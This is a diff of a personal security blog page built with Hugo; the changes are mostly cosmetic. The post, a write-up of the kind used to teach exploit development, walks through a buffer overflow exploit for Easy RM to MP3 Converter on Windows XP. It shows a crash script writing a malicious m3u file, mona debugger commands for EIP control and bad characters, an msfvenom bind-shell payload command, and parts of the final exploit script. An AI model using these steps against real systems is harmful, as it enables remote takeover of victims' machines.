@@ -10,7 +10,7 @@
   <meta itemprop="description" content="Prequisites Windows XP SP3 (en-us) Immunity Debugger Easy RM to MP3 Converter Identifying the Vulnerability First of all we need to identify the appropriate buffer size for the exploit. To do this, we simply execute the following python script. 1 buffer = &quot;A&quot; * 30000 2 3 filename=&quot;evil.m3u&quot; 4 evilfile = open(filename , &#39;w&#39;) 5 evilfile.write(buffer) 6 evilfile.close() Identifying EIP Offset Subsequently, open up the resulting playlist in the converter. Boom, the application crashes.">
 
   
-  <meta itemprop="keywords" content="certifications,challenge,ctf,exploit,exploit-exercises,hacking,hashcat,offensive-security,protostar,reverse-engineering,sans,seh," />
+  <meta itemprop="keywords" content="certifications,challenge,ctf,dns,exploit,exploit-exercises,golang,hacking,hashcat,information-gathering,offensive-security,protostar,reverse-engineering,sans,seh," />
   
     <meta itemprop="wordCount" content="551">
   
@@ -39,18 +39,18 @@
   
 
 
-  <meta name="generator" content="Hugo 0.15" />
+  <meta name="generator" content="Hugo 0.16" />
   <link href="" rel="alternate" type="application/rss+xml" title="camelinc" />
-  <link href="http://camelinc.info//css/bootstrap.min.css" rel="stylesheet">
-  <link href="http://camelinc.info//css/hc.css" rel="stylesheet">
+  <link href="http://camelinc.info/css/bootstrap.min.css" rel="stylesheet">
+  <link href="http://camelinc.info/css/hc.css" rel="stylesheet">
 
   
-  <link rel="stylesheet" href="http://camelinc.info//css/zenburn.css" type="text/css" media="screen" />
+  <link rel="stylesheet" href="http://camelinc.info/css/zenburn.css" type="text/css" media="screen" />
 
   
 
   
-  <link rel="stylesheet" href="http://camelinc.info//lightbox/css/lightbox.css" type="text/css" media="screen">
+  <link rel="stylesheet" href="http://camelinc.info/lightbox/css/lightbox.css" type="text/css" media="screen">
 
 
   <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
@@ -60,9 +60,8 @@
  
 
 
-  <body>
+<body>
 
-  
 <div class="nav-toggle"><i class="fa fa-bars fa-2x"></i> Herring Cove </div>
   <div id = "wrapper">
 
@@ -77,11 +76,9 @@
           </button>
           <a href="http://camelinc.info//"><p class="navbar-brand">camelinc</p></a>
         </div>
-
         <div class="navbar-collapse collapse">
           <ul class="nav navbar-nav">
 					
-          <h2>http://camelinc.info/</h2>
 					
 					<li><a href="http://camelinc.info/about">About </a></li>
 					
@@ -91,6 +88,8 @@
         </div>
       </div>
     </div>
+
+
 
        
        <div id="sidebar-wrapper">
@@ -130,14 +129,13 @@
      <div class="container">
 
 
-
   <div id="article">
     <div class="article-title">Easy RM to MP3 Converter</div>
     <p class="meta"><small>&nbsp;<i class="fa fa-calendar-o"></i> 2014-05-25</small></p> <hr/>
     <div class="post">
       
 
-<h1 id="prequisites:2fa3dea1838e5e913d9862f6536a17e3">Prequisites</h1>
+<h1 id="prequisites">Prequisites</h1>
 
 <ul>
 <li>Windows XP SP3 (en-us)</li>
@@ -145,7 +143,7 @@
 <li><a href="http://www.exploit-db.com/wp-content/themes/exploit/applications/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe">Easy RM to MP3 Converter</a></li>
 </ul>
 
-<h1 id="identifying-the-vulnerability:2fa3dea1838e5e913d9862f6536a17e3">Identifying the Vulnerability</h1>
+<h1 id="identifying-the-vulnerability">Identifying the Vulnerability</h1>
 
 <p>First of all we need to identify the appropriate buffer size for the exploit.
 To do this, we  simply execute the following python script.</p>
@@ -159,7 +157,7 @@ To do this, we  simply execute the following python script.</p>
 </code></pre></div>
 
 
-<h1 id="identifying-eip-offset:2fa3dea1838e5e913d9862f6536a17e3">Identifying EIP Offset</h1>
+<h1 id="identifying-eip-offset">Identifying EIP Offset</h1>
 
 <p>Subsequently, open up the resulting playlist in the converter.
 Boom, the application crashes.</p>
@@ -215,7 +213,7 @@ The application crashes and we now have a unique pattern stored in EIP.</p>
 Subsequently, this allows an update of the exploit script in order to reflect the newly acquired knowledge.
 This gives us power over EIP.</p>
 
-<p>
+
 
 <figure >
     <a href="/img/post/2014/easy-rm-to-mp3-converter/overwrite_EIP.png" data-lightbox="default" data-title="Verifying the offset by overwriting EIP with BBBB." >
@@ -223,18 +221,18 @@ This gives us power over EIP.</p>
     </a>
 </figure>
 
-</p>
 
-<h1 id="controlling-eip:2fa3dea1838e5e913d9862f6536a17e3">Controlling EIP</h1>
+
+<h1 id="controlling-eip">Controlling EIP</h1>
 
 <p>The next step is to jump to a shellcode.
 Mona helps finding an appropriate address in memory.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona jmp -r esp</span>
 </code></pre></div>
-</p>
 
-<p>
+
+
 
 <figure >
     <a href="/img/post/2014/easy-rm-to-mp3-converter/jmp_esp.png" data-lightbox="default" data-title="Moan.py lists the possible JMP ESP instructions." >
@@ -242,25 +240,25 @@ Mona helps finding an appropriate address in memory.</p>
     </a>
 </figure>
 
-</p>
+
 
 <p>For this exploit the instruction at 0x77c72eee was chosen.
 This allows us to jump to ESP.</p>
 
-<h1 id="identifying-bad-characters:2fa3dea1838e5e913d9862f6536a17e3">Identifying Bad Characters</h1>
+<h1 id="identifying-bad-characters">Identifying Bad Characters</h1>
 
 <p>As ESP points to 0x000FF730 (EIP+4) we can place our shellcode at the specific location.
 Before generating a payload, we also have to check for <strong>bad characters</strong>.
 Mona also provides help and can create an array with excluded characters.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00\x0A&#39;</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona bytearray -b &#39;\x00\x0A&#39;</span>
 </code></pre></div>
-</p>
+
 
 <p>The array has to be included in the buffer.
 Subsequently, bad characters can be identified in a debugger.</p>
 
-<p>
+
 
 <figure >
     <a href="/img/post/2014/easy-rm-to-mp3-converter/bad_chars.png" data-lightbox="default" data-title="The byte array in memory is used to identify bad characters." >
@@ -268,30 +266,30 @@ Subsequently, bad characters can be identified in a debugger.</p>
     </a>
 </figure>
 
-</p>
+
 
 <p>Mona also provides a command to help with this step of exploit development.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f bytearray.bin</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">!mona compare -f bytearray.bin</span>
 </code></pre></div>
-</p>
 
-<h1 id="adding-shellcode:2fa3dea1838e5e913d9862f6536a17e3">Adding Shellcode</h1>
+
+<h1 id="adding-shellcode">Adding Shellcode</h1>
 
 <p>After iterating the above process in order to identify all bad characters a payload can be create.
 Metasploit provides numerous payloads to choose from.
 Most importantly, the payload has to be encoded as to eliminate any bad characters.</p>
 
-<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0a\x0d&#39;</span>
+<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="go">msfvenom -p windows/console_bind_tcp LPORT=9988 -f python --platform win --arch x86 -b &#39;\x00\x0a\x0d&#39;</span>
 </code></pre></div>
-</p>
 
-<h1 id="the-exploit:2fa3dea1838e5e913d9862f6536a17e3">The Exploit</h1>
+
+<h1 id="the-exploit">The Exploit</h1>
 
 <p>Following this, the payload has to be added to the exploit script.
 The final step is to create the malicious m3u file and manually load it into the software.</p>
 
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="lineno"> 1 </span><span class="c">#!/usr/bin/python -w</span>
 <span class="lineno"> 2 </span>
 <span class="lineno"> 3 </span><span class="kn">import</span> <span class="nn">struct</span>
 <span class="lineno"> 4 </span>
@@ -337,7 +335,7 @@ The final step is to create the malicious m3u file and manually load it into the
 <span class="lineno">44 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
 <span class="lineno">45 </span><span class="n">evilfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </code></pre></div>
-</p>
+
 
 <p>By loading the m3u file, the payload is executed.</p>
 
@@ -351,7 +349,7 @@ The final step is to create the malicious m3u file and manually load it into the
 
 </p>
 
-<h1 id="links-and-references:2fa3dea1838e5e913d9862f6536a17e3">Links and References</h1>
+<h1 id="links-and-references">Links and References</h1>
 
 <ul>
 <li><a href="http://www.exploit-db.com/exploits/9186/">EDB-ID: 9186</a></li>
